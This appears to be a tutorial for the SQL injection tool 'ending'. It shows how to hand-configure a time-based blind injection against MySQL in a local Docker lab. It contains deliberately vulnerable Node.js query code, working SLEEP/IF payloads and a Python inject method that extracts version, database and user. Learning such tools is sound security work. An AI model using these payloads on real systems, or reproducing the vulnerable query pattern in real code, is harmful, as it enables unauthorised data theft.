# Time-based SQL injection

DBMS | Type | Tags
-|-|-
MySQL | Time-based | manual setup, time based

The automatic configuration can not (yet) detect time-based SQL injections. Let's see how we can setup one ourselves.

Vulnerable code:

```js
app.post('/message', (req, res) => {
    const { message } = req.body;
    if (!message) {
        return res.status(400).send('Missing message');
    }
    const query = "INSERT INTO messages (message) VALUES ('" + message + "')";

    db.query(query, [], (err, results) => {
        res.status(201).send('Message sent.');
    });
});
```

Here, we can induce a delay by sending a message such as `-SLEEP(1)-`. To make this delay conditional, we can use `-IF({condition},SLEEP(1),0)-'`.

## Setup

The test setup is available as `ending-tutorials/time-based`:

```bash
$ git clone https://github.com/cfreal/ending-tutorials
$ cd ending-tutorials/time-based
$ docker compose up --build
```

Create a design named, for instance, `time-based-tutorial`:

```bash
$ ending time-based-tutorial create
```

Update the `send()` method:

```python
    async def send(self, payload: str) -> bytes:
        # Send a message
        response = await self.session.post(
            "http://localhost:5000/message",
            json={
                "message": payload,
            }
        )
        return response.content
```

## Time-based injection

Since the injection is time-based, **ending** is not able to configure the attack automatically.

Let's verify this:

```bash
$ ending time-based-tutorial configure
```

It fails, as expected. To make the injection work, we will need to configure it manually. 

But we don't have to do everything ourselves: we can make ending generate a template for us, and just fill in the gaps. Let's do this using `configure --manual` (or `-m`):

```bash
$ ending time-based-tutorial configure -m
```

However, since we know already that we will perform a time-based SQL injection on MySQL, we can let **ending** know:

```bash
$ ending time-based-tutorial configure -f -m --dbms mysql --method timebased
```

This will generate a design specifically built for time-based SQL injections on MySQL. We just need to fill in the gaps!

## Filling the gaps

The `inject()` method needs to induce a delay if `condition` is true. To do this in our case, we can build a payload such as:

```
'-IF(({condition}), SLEEP(1), 0)-'
```

We therefore have the following `inject()` method:

```python
    async def inject(self, condition: Node) -> None:
        # TODO The payload must induce a delay if the condition is true
        payload = f"'-IF(({condition}), SLEEP(1), 0)-'"
        response = await self.send(payload)
        return None
```

Now, let's indicate the delay we used in `set_method()`.

```python
    async def set_method(self) -> Compiler:
        return TimebasedTestMethod(
            self.compiler,
            self.inject,
            delay=1, # Minimum delay induced by SQL statements that evaluate to true
        )
```

We're done! Call `validate` to make sure the design works properly:

```
$ ending time-based-tutorial validate
```

Everything should go smoothly. We can now run a query to ensure that it works fine:

```bash
$ ending time-based-tutorial query -f 'version()' 'database()' 'user()'
```

# Conclusion

In this tutorial, we learned how to manually configure a time-based SQL injection attack using **ending**. We created a design template, and then set the `inject()` and `set_method()` methods, validated the design, and ran a query to test the injection.

Check [Time-based SQL injection](../library/method.md#timebasedtestmethod-time-based) to see the supported parameters and implementation details.